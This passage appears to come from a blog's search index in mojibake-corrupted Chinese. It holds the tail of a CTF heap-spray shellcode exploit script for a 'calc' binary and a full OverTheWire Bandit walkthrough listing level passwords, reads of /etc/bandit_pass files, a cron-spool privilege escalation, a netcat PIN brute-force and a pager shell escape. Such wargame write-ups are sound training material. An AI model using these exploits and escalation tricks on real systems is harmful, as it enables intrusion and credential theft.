†ç©ºé—´å¸ƒå±€ä¸€äº›shellcodeï¼Œå¹¶ä¸”åŠ«æŒ`(*(void (**)(void))(v9 + 8))()`æ‰§è¡Œæˆ‘ä»¬çš„shellcodeã€‚ä½†æ˜¯æˆ‘ä»¬å¾ˆéš¾ç²¾ç¡®å°†shellcodeå¸ƒç½®åˆ°è¯¥åœ°å€ï¼Œå› æ­¤é‡‡ç”¨'\\x0c'æ»‘æ¿æŒ‡ä»¤ï¼Œç»“åˆshellcodeçš„æ–¹å¼å®Œæˆåˆ©ç”¨ã€‚\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch = \"i386\",os = \"linux\")\nmyelf = ELF(\"./calc\")\nmyproc = process(myelf.path)\n\n#payload = '\"a\" * 100000'\npayload = '\"' + asm(shellcraft.sh()).ljust(200,'\\x0c') + '\" * 500'\nfor i in range(6000):\n    myproc.sendlineafter(\">\",payload)\ngdb.attach(myproc,\"b * 0x0804A89C\\nc\")\n\nmyproc.recvuntil(\">\")\npayload = \"1 \" * 33\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```","categories":["CTF"]},{"title":"overthewire bandit","url":"/2020/05/17/overthewire-bandit/","content":"\n# 1 é¢˜ç›®é“¾æ¥\n\n[https://overthewire.org/wargames/bandit/](https://overthewire.org/wargames/bandit/)\n\n# 2 è§£é¢˜è¿‡ç¨‹\n\n(0)\n\nbandit.labs.overthewire.org, on port 2220\n\n(1)\n\nssh bandit1@bandit.labs.overthewire.org -p 2220\n\nboJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\n(2)\n\nssh bandit2@bandit.labs.overthewire.org -p 2220\n\nCV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n`cat \"spaces in this filename\"`\n`cat spaces\\ in\\ this\\ filename`\n\n(3)\n\nssh bandit3@bandit.labs.overthewire.org -p 2220\n\nUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n(4)\n\nssh bandit4@bandit.labs.overthewire.org -p 2220\n\npIwrPrtPN36QITSp3EQaw936yaFoFgAB\n\n```\nbandit4@bandit:~/inhere$ file ./-file*\n./-file00: data\n./-file01: data\n./-file02: data\n./-file03: data\n./-file04: data\n./-file05: data\n./-file06: data\n./-file07: ASCII text\n./-file08: data\n./-file09: data\nbandit4@bandit:~/inhere$ cat ./-file07\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n```\n(5)\n\nssh bandit5@bandit.labs.overthewire.org -p 2220\n\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n```\nfind ./ -type f -size 1033c\n```\n\n(6)\n\nssh bandit6@bandit.labs.overthewire.org -p 2220\n\nDXjZPULLxYr17uwoI01bNLQbtFemEgo7\n\n```\nfind ./ -size 33c -user bandit7 -group bandit6\ncat ./var/lib/dpkg/info/bandit7.password\n```\n\n\n\n(7)\n\nssh bandit7@bandit.labs.overthewire.org -p 2220\n\nHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n\n```\ngrep -ri millionth\n```\n\n\n\n(8)\n\nssh bandit8@bandit.labs.overthewire.org -p 2220\n\ncvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n```\nsort ./data.txt | uniq -u\n```\n\n\n\n(9)\n\nssh bandit9@bandit.labs.overthewire.org -p 2220\n\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n\n```\nstrings ./data.txt | grep ====\n```\n\n\n\n(10)\n\nssh bandit10@bandit.labs.overthewire.org -p 2220\n\ntruKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk\n\n```\nbandit10@bandit:~$ base64 -d data.txt \nThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n```\n\n(11)\n\nssh bandit11@bandit.labs.overthewire.org -p 2220\n\nIFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n\n```\nbandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\nThe password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n```\n\n(12)\n\nssh bandit12@bandit.labs.overthewire.org -p 2220\n\n5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\n```shell\n    7  mkdir /tmp/bling\n    8  cp data.txt /tmp/bling\n    9  cd /tmp/bling\n   13  xxd -r data.txt data.bin\n   18  file data.bin\n   19  mv data.bin data.gz\n   20  gzip -d data.gz\n   22  file data\n   23  bzip2 -d data\n   25  file data.out\n   26  mv data.out data.gz\n   28  gzip -d data.gz\n   30  file data\n   31  tar -xvf data\n   33  file data5.bin\n   35  tar -xvf data5.bin\n   36  file data6.bin\n   37  bzip2 -d data6.bin\n   39  file data6.bin.out\n   40  tar -xvf data6.bin.out\n   45  file data8.bin\n   46  mv data8.bin data8.gz\n   48  gzip -d data8.gz\n   50  file data8\n   51  cat data8\n```\n\n(13)\n\nssh bandit13@bandit.labs.overthewire.org -p 2220\n\n8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n\n```\nssh bandit14@localhost -i sshkey.private\ncat  /etc/bandit_pass/bandit14\n```\n\n(14)\n\nssh bandit14@bandit.labs.overthewire.org -p 2220\n\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n\n```shell\nbandit14@bandit:~$ nc localhost 30000\n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\nCorrect!\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n```\n\n(15)\n\nssh bandit15@bandit.labs.overthewire.org -p 2220\n\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n\n```shell\nbandit15@bandit:~$ openssl s_client -connect localhost:30001\nCONNECTED(00000003)\ndepth=0 CN = localhost\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = localhost\nverify return:1\n---\nCertificate chain\n 0 s:/CN=localhost\n   i:/CN=localhost\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\nMIICBjCCAW+gAwIBAgIEDU18oTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls\nb2NhbGhvc3QwHhcNMjAwNTA3MTgxNTQzWhcNMjEwNTA3MTgxNTQzWjAUMRIwEAYD\nVQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAK3CPNFR\nFEypcqUa8NslmIMWl9xq53Cwhs/fvYHAvauyfE3uDVyyX79Z34Tkot6YflAoufnS\n+puh2Kgq7aDaF+xhE+FPcz1JE0C2bflGfEtx4l3qy79SRpLiZ7eio8NPasvduG5e\npkuHefwI4c7GS6Y7OTz/6IpxqXBzv3c+x93TAgMBAAGjZTBjMBQGA1UdEQQNMAuC\nCWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0\nZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3\nDQEBBQUAA4GBAC9uy1rF2U/OSBXbQJYuPuzT5mYwcjEEV0XwyiX1MFZbKUlyFZUw\nrq+P1HfFp+BSODtk6tHM9bTz+p2OJRXuELG0ly8+Nf/hO/mYS1i5Ekzv4PL9hO8q\nPfmDXTHs23Tc7ctLqPRj4/4qxw6RF4SM+uxkAuHgT/NDW1LphxkJlKGn\n-----END CERTIFICATE-----\nsubject=/CN=localhost\nissuer=/CN=localhost\n---\nNo client certificate CA names sent\nPeer signing digest: SHA512\nServer Temp Key: X25519, 253 bits\n---\nSSL handshake has read 1019 bytes and written 269 bytes\nVerification error: self signed certificate\n---\nNew, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384\nServer public key is 1024 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nNo ALPN negotiated\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384\n    Session-ID: 007E0D8A0128B2FF4D905508CF737C9AA328D4D7EC300F3670BF87BF48F448AB\n    Session-ID-ctx: \n    Master-Key: 0943896BA02534F6AD45C9F4FD218941160F569022FD88ADD3C91E5555A65B4E56FBAC7628F26A5703404039B9AF6C4D\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 7200 (seconds)\n    TLS session ticket:\n    0000 - aa 02 e6 3a 2e 0b c8 5d-6f 54 4a 1b 5a e0 2c 0e   ...:...]oTJ.Z.,.\n    0010 - 2b 8e 00 de ab bf a4 f4-12 a3 29 78 f8 c9 c1 86   +.........)x....\n    0020 - ff 7e ea db 76 0f 6c b8-45 ee 4c bd 2e 81 3f ff   .~..v.l.E.L...?.\n    0030 - 81 ff c9 0d 2b 14 fe c9-28 84 1d 41 80 47 9f 9b   ....+...(..A.G..\n    0040 - b6 72 e4 9e d1 80 c6 9c-d6 05 8c 58 31 b2 14 f3   .r.........X1...\n    0050 - b5 ca 94 a9 02 01 7e b7-6d a1 7d 6d fb 07 9f b5   ......~.m.}m....\n    0060 - 41 25 06 59 eb 61 d3 62-16 d3 69 35 5a b1 49 07   A%.Y.a.b..i5Z.I.\n    0070 - 53 3f 04 5f f2 b7 e7 45-34 56 82 f5 6e 2e fe 0d   S?._...E4V..n...\n    0080 - a9 cd a6 d5 ff 90 89 b1-a6 4c 82 8b 8b b8 a8 15   .........L......\n    0090 - 95 6e d9 9f 0b bb 4a 9e-e2 01 60 c0 9c 44 a3 6a   .n....J...`..D.j\n\n    Start Time: 1589699552\n    Timeout   : 7200 (sec)\n    Verify return code: 18 (self signed certificate)\n    Extended master secret: yes\n---\nBfMYroe26WYalil77FoDi9qh59eK5xNr\nCorrect!\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\nclosed\n```\n\n\n\n(16)\n\nssh bandit16@bandit.labs.overthewire.org -p 2220\n\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\n```shell\nbandit16@bandit:~$ nmap -p 31000-32000 localhost\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2020-05-17 09:18 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00028s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n31046/tcp open  unknown\n31518/tcp open  unknown\n31691/tcp open  unknown\n31790/tcp open  unknown\n31960/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n-------------------------------------------------------------------------------\nbandit16@bandit:~$ nmap -sV -p 31000-32000 localhost\n\nStarting Nmap 7.40 ( https://nmap.org ) at 2020-05-17 09:34 CEST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00025s latency).\nNot shown: 996 closed ports\nPORT      STATE SERVICE     VERSION\n31046/tcp open  echo\n31518/tcp open  ssl/echo\n31691/tcp open  echo\n31790/tcp open  ssl/unknown\n31960/tcp open  echo\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31790-TCP:V=7.40%T=SSL%I=7%D=5/17%Time=5EC0E90B%P=x86_64-pc-linux-g\nSF:nu%r(GenericLines,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20cu\nSF:rrent\\x20password\\n\")%r(GetRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\nSF:\\x20correct\\x20current\\x20password\\n\")%r(HTTPOptions,31,\"Wrong!\\x20Plea\nSF:se\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(RTSPRequest,\nSF:31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\\nSF:n\")%r(Help,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x\nSF:20password\\n\")%r(SSLSessionReq,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20\nSF:correct\\x20current\\x20password\\n\")%r(TLSSessionReq,31,\"Wrong!\\x20Please\nSF:\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(Kerberos,31,\"W\nSF:rong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r\nSF:(FourOhFourRequest,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20c\nSF:urrent\\x20password\\n\")%r(LPDString,31,\"Wrong!\\x20Please\\x20enter\\x20the\nSF:\\x20correct\\x20current\\x20password\\n\")%r(LDAPSearchReq,31,\"Wrong!\\x20Pl\nSF:ease\\x20enter\\x20the\\x20correct\\x20current\\x20password\\n\")%r(SIPOptions\nSF:,31,\"Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\nSF:\\n\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.00 seconds\n------------------------------------------------------------------------\nbandit16@bandit:~$ mkdir /tmp/bling2/\nbandit16@bandit:~$ echo \"cluFn7wTiGryunymYOu4RcffSxQluehd\" | openssl s_client -connect localhost:31790 -quiet 2>/dev/null | tail -n 28 > /tmp/bling2/ssh.private\n-----------------------------------------------------------------------\nssh -i ssh.private bandit17@localhost\ncat /etc/bandit_pass/bandit17\n```\n\n\n\n(17)\n\nssh bandit17@bandit.labs.overthewire.org -p 2220\n\nxLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n\n```\nbandit17@bandit:~$ diff passwords.old passwords.new\n42c42\n< w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii\n---\n> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n```\n\n(18)\n\nssh bandit18@bandit.labs.overthewire.org -p 2220\n\nkfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n\n```\nbling@bling:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat readme\"\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit18@bandit.labs.overthewire.org's password: \nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n```\n\n(19)\n\nssh bandit19@bandit.labs.overthewire.org -p 2220\n\nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n\n```\nbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n```\n\n(20)\n\nssh bandit20@bandit.labs.overthewire.org -p 2220\n\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n\n```\nä¸€ä¸ªç»ˆç«¯ï¼š\nbandit20@bandit:~$ nc -l -p 2333 < /etc/bandit_pass/bandit20\n\nå¦ä¸€ä¸ªç»ˆç«¯ï¼š\nbandit20@bandit:~$ ./suconnect 2333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n\nç¬¬ä¸€ä¸ªç»ˆç«¯æ¥æ”¶åˆ°å¦‚ä¸‹å­—ç¬¦ä¸²ï¼š\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n```\n\næˆ–è€…ç”¨ä¸€æ¡å‘½ä»¤å®Œæˆ\n\n```\nsh -c \"nc -l -p 2333 & < /etc/bandit_pass/bandit20\"; ./suconnect 2333\nor \nsh -c \"echo 'GbKksEFF4yrVs6il55v6gwY5aVje5f0j' | nc -l -p 2333 &\";./suconnect 8888\n```\n\n(21)\n\nssh bandit21@bandit.labs.overthewire.org -p 2220\n\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n\n```shell\nbandit21@bandit:~$ cd /etc/cron.d/\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22\n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh\n#!/bin/bash\nchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\ncat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n----------------------------------------------------------------------\nbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n```\n\n(22)\n\nssh bandit22@bandit.labs.overthewire.org -p 2220\n\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n\n```shell\nbandit22@bandit:~$ cd /etc/cron.d\nbandit22@bandit:/etc/cron.d$ cat cronjob_bandit23\n@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\n* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\nbandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh\n#!/bin/bash\n\nmyname=$(whoami)\nmytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n\necho \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\n\ncat /etc/bandit_pass/$myname > /tmp/$mytarget\nbandit22@bandit:/etc/cron.d$ /usr/bin/cronjob_bandit23.sh\nCopying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3\nbandit22@bandit:/etc/cron.d$ cat /tmp/8169b67bd894ddbb4412f91573b38db3\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\nå‘ç°ä¸å¯¹ï¼Œäºæ˜¯é‡‡ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š\nbandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1\n8ca319486bfbbc3663ea0fbe81326349\nbandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n```\n\n(23)\n\nssh bandit23@bandit.labs.overthewire.org -p 2220\n\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n\n```shell\nbandit23@bandit:~$ cd /etc/cron.d\nbandit23@bandit:/etc/cron.d$ cat cronjob_bandit24\n@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\nbandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh\n#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname\necho \"Executing and deleting all scripts in /var/spool/$myname:\"\nfor i in * .*;\ndo\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\n\n```\n\n```shell\nmkdir /tmp/bling3\nchmod 777 /tmp/bling3\ncd /tmp/bling3\nvim test.sh\n\t#!/bin/sh\n\tcat /etc/bandit_pass/bandit24 > /tmp/bling3/result24\nchmod 777 test.sh\ncp test.sh /var/spool/bandit24/test.sh\nç­‰å¾…ä¸€ä¼šå„¿\ncat result24\n```\n\n(24)\n\nssh bandit24@bandit.labs.overthewire.org -p 2220\n\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n\n```shell\nbandit24@bandit:/tmp/bling4$ vim test.py\n--------------------\n\t#!/usr/bin/env python\n\tf = open('test.txt','w')\n\tfor i in range(10000):\n\t\tpayload = \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\" + \" \" + str(i).zfill(4) + '\\n'\n\t\tf.write(payload)\n\tf.close()\n--------------------\nbandit24@bandit:/tmp/bling4$ python test.py\nbandit24@bandit:/tmp/bling4$ nc localhost 30002 < /tmp/bling4/test.txt > /tmp/bling4/result.txt\nbandit24@bandit:/tmp/bling4$ sort ./result.txt | uniq -u\n\nCorrect!\nExiting.\nI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n```\n\n(25)\n\nssh bandit25@bandit.labs.overthewire.org -p 2220\n\nuNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\n```\næŠŠçª—å£è°ƒæ•´åˆ°åªèƒ½æ˜¾ç¤º3/4è¡Œçš„çŠ¶æ€\n$ ssh -i bandit26.sshkey bandit26@localhost\nåœ¨moreç•Œé¢æ‰§è¡Œå‘½ä»¤\nv - è¿›å…¥ç¼–è¾‘æ¨¡å¼\nr /etc/bandit_pass/bandit26\n```\n\n(26)\n\nssh bandit26@bandit.labs.overthewire.org -p 2220\n\n5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n\n```\næŠŠçª—å£è°ƒæ•´åˆ°åªèƒ½æ˜¾ç¤º3/4è¡Œçš„çŠ¶æ€\nsshç™»å½•ä¸Šå»ï¼Œç„¶ååˆ°moreç•Œé¢æ—¶ï¼ŒæŒ‰vè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œæ‰§è¡Œä»¥ä¸‹ä¸¤æ¡å‘½ä»¤å°±å¯ä»¥è·å–shell\n:set shell=/bin/sh\n:shell\nbandit26@bandit:~$ ls\nbandit27-do  text.txt\nbandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27\n3ba3118a22e93127a4ed485be72ef5ea\n```\n\n(27)\n\nssh bandit27@bandit.labs.overthewire.org -p 2220\n\n3ba3118a22e93127a4ed485be72ef5ea\n\n```shell\nbandit27@bandit:~$ mkdir /tmp/bling\nbandit27@bandit:~$ cd /tmp/bling\nbandit27@bandit:/tmp/bling$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo\nCloning into 'repo'...\nCould not create directory '/home/bandit27/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit27-git@localhost's password: \nremote: Counting objects: 3, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 0 (delta 0)\nReceiving objects: 100% (3/3), done.\nbandit27@bandit:/tmp/bling$ ls\nrepo\nbandit27@bandit:/tmp/bling$ cd repo\nbandit27@bandit:/tmp/bling/repo$ ls\nREADME\nbandit27@bandit:/tmp/bling/repo$ cat README\nThe password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2\n\n```\n\n(28)\n\nssh bandit28@bandit.labs.overthewire.org -p 2220\n\n0ef186ac70e04ea33b4c1853d2526fa2\n\n```shell\næ‹‰ä¸‹repoåï¼š\nbandit28@bandit:/tmp/bling28/repo$ git log\ncommit edd935d60906b33f0619605abd1689808ccdd5ee\nAuthor: Morla Porla <morla@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    fix info leak\n\ncommit c086d11a00c0648d095d04c089786efef5e01264\nAuthor: Morla Porla <morla@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    add missing data\n\ncommit de2ebe2d5fd1598cd547f4d56247e053be3fdc38\nAuthor: Ben Dover <noone@overthewire.org>\nDate:   Thu May 7 20:14:49 2020 +0200\n\n    initial commit of README.md\n\nbandit28@bandit:/tmp/bling28/repo$ git reset --hard c086d11a00c0648d095d04c089786efef5e01264\nHEAD is now at c086d11 add missing data\nbandit28@bandit:/tmp/bling28/repo$ cat README.md \n# Bandit Notes\nSome notes for level29 of bandit.\n\n## credentials\n\n- username: bandit29\n- password: bbc96594b4e001778eee9975372716b2\n```\n\n\n\n(29)\n\nssh bandit29@bandit.labs.overthewire.org -p 2220\n\nbbc96594b4e001778eee9975372716b2\n\n```shell\næ‹‰ä¸‹repoåï¼š\nbandit29@bandit:/tmp/bling29/repo$ git branch -a\n* master\n  remotes/origin/HEAD -> origin/master\n  remotes/origin/dev\n  remotes/origin/master\n  remotes/origin/sploits-dev\nbandit29@bandit:/tmp/bling29/repo$ git checkout origin/dev\nPrevious HEAD position was 786d5be... add some silly exploit, just for shit and giggles\nHEAD is now at bc83328... add data needed for development\nbandit29@bandit:/tmp/bling29/repo$ cat README.md \n# Bandit Notes\nSome notes for bandit30 of bandit.\n\n## credentials\n\n- username: bandit30\n- password: 5b90576bedb2cc04c86a9e924ce42faf\n```\n\n(30)\n\nssh bandit30@bandit.labs.overthewire.org -p 2220\n\n5b90576bedb2cc04c86a9e924ce42faf\n\n```shell\nbandit30@bandit:/tmp/bling30/repo$ cd .git\nbandit30@bandit:/tmp/bling30/repo/.git$ cat *\ncat: branches: Is a directory\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = ssh://bandit30-git@localhost/home/bandit30-git/repo\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\nUnnamed repository; edit this file 'description' to name the repository.\nref: refs/heads/master\ncat: hooks: Is a directory\nDIRC\u0002\u0001^ï¿½3ï¿½\nï¿½^ï¿½3ï¿½     e\nï¿½ï¿½\u0003\u0006$ï¿½ï¿½ï¿½+\u0016\u001e\u0002ï¿½ï¿½!ï¿½L4 ]R\u0013?ï¿½ï¿½Ö›ï¿½ï¿½7w\tREADME.mdTREE\u00191 0\nï¿½ï¿½Y.ï¿½Uï¿½ï¿½ï¿½ï¿½ï¿½36:Fï¿½ï¿½JGVV\u0002F*-`-ï¿½ï¿½Iï¿½ï¿½ï¿½}u/)Qcat: info: Is a directory\ncat: logs: Is a directory\ncat: objects: Is a directory\n# pack-refs with: peeled fully-peeled \n3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/master\nf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret\ncat: refs: Is a directory\nbandit30@bandit:/tmp/bling30/repo/.git$ ls -al\ntotal 52\ndrwxr-sr-x 8 bandit30 root 4096 May 17 14:52 .\ndrwxr-sr-x 3 bandit30 root 4096 May 17 14:52 ..\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 branches\n-rw-r--r-- 1 bandit30 root  276 May 17 14:52 config\n-rw-r--r-- 1 bandit30 root   73 May 17 14:52 description\n-rw-r--r-- 1 bandit30 root   23 May 17 14:52 HEAD\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 hooks\n-rw-r--r-- 1 bandit30 root  137 May 17 14:52 index\ndrwxr-sr-x 2 bandit30 root 4096 May 17 14:52 info\ndrwxr-sr-x 3 bandit30 root 4096 May 17 14:52 logs\ndrwxr-sr-x 4 bandit30 root 4096 May 17 14:52 objects\n-rw-r--r-- 1 bandit30 root  165 May 17 14:52 packed-refs\ndrwxr-sr-x 5 bandit30 root 4096 May 17 14:52 refs\nbandit30@bandit:/tmp/bling30/repo/.git$ git show --name-only secret\n47e603bb428404d265f59c42920d81e5\n```\n\n\n\n(31)\n\nssh bandit31@bandit.labs.overthewire.org -p 2220\n\n47e603bb428404d265f59c42920d81e5\n\n```shell\nå°†repoæ‹‰åˆ°æœ¬åœ°åï¼š\nbandit31@bandit:/tmp/bling31/repo$ ls -al\ntotal 20\ndrwxr-sr-x 3 bandit31 root 4096 May 17 15:00 .\ndrwxr-sr-x 3 bandit31 root 4096 May 17 14:59 ..\ndrwxr-sr-x 8 bandit31 root 4096 May 17 15:00 .git\n-rw-r--r-- 1 bandit31 root    6 May 17 15:00 .gitignore\n-rw-r--r-- 1 bandit31 root  147 May 17 15:00 README.md\nbandit31@bandit:/tmp/bling31/repo$ echo \"May I come in?\" > key.txt\nbandit31@bandit:/tmp/bling31/repo$ git add -f key.txt\nbandit31@bandit:/tmp/bling31/repo$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n\tnew file:   key.txt\n\nbandit31@bandit:/tmp/bling31/repo$ git commit -m \"add\"\n[master 93d69fa] add\n 1 file changed, 1 insertion(+)\n create mode 100644 key.txt\nbandit31@bandit:/tmp/bling31/repo$ git push origin master\nCould not create directory '/home/bandit31/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.\nAre you sure you want to continue connecting (yes/no)? yes\nFailed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).\nThis is a OverTheWire game server. More information on http://www.overthewire.org/wargames\n\nbandit31-git@localhost's password: \nCounting objects: 3, done.\nDelta compression using up to 2 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 315 bytes | 0 bytes/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nremote: ### Attempting to validate files... ####\nremote: \nremote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.\nremote: \nremote: Well done! Here is the password for the next level:\nremote: 56a9bf19c63d650ce78e6ec0354ee45e\nremote: \nremote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.\nremote: \nTo ssh://localhost/home/bandit31-git/repo\n ! [remote rejected] master -> master (pre-receive hook declined)\nerror: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'\n```\n\n(32)\n\nssh bandit32@bandit.labs.overthewire.org -p 2220\n\n56a9bf19c63d650ce78e6ec0354ee45e\n\n```shell\n>> $0\n$ ls\nuppershell\n$ cat /etc/bandit_pass/bandit33\nc9c3199ddf4121b10cf581a98d51caee\n```\n\n(33)\n\nssh bandit33@bandit.labs.overthewire.org -p 2220\n\nc9c3199ddf4121b10cf581a98d51caee\n\n```\né¢˜ç›®è¿˜æ²¡å‡ºæ¥\n```\n\n# 3 